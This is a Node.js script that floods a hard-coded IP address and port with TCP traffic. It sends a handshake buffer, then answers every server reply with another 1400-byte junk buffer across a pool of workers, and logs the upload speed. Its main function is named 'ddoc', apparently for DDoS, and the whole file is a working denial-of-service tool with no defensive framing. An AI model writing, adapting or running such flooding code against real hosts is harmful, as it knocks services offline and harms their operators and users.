#!/usr/bin/node
/**
 * @file index.js -- all things
 * @author XCRail Fans
 * @copyright public "otome" domain
 */
'use strict'

const threads = require('threads')
const thread = threads.spawn(function(){})
const net = require('net')

const host = '222.187.254.57'
const port = '27305'
const nick = ['xiaocao2015']
const guys = 1

var futa = 0 // :int
var _up_ = 0

const hellow = Buffer.from([0x07, 0x00, 0x04, 0x01, 0x30, 0x63, 0xdd, 0x01])
const buffet = Buffer.from([...new Array(1400).keys()].map((i) => i%2))

function ddoc(data, done){
  let _TATP_ = 0
  let suckit = new net.Socket()
  let coming = () => {
    return suckit.write(buffet, () => {
      ++_TATP_
      _up_ += 1.4
    })
  }
  suckit.on('close', () => {
    --futa
    done(_TATP_)
  })
  suckit.on('data', () => {
    coming()
  })
  suckit.connect({
    port: port,
    host: host,
  }, function(){
    ++futa
    suckit.write(hellow)
    coming()
  })
}

const pool = new threads.Pool(guys)
pool.on('done', function(job, message) {
  console.log('sent: ' + message)
})
;[...new Array(guys).keys()].forEach((i) => pool.run(ddoc).send('good'))

function clearSpeed(){
  console.log((_up_ /= 2) >> 10 + ' KB/s up, ' + futa + 'futas coming.')
  setTimeout(clearSpeed, 500)
}
setTimeout(clearSpeed, 500)
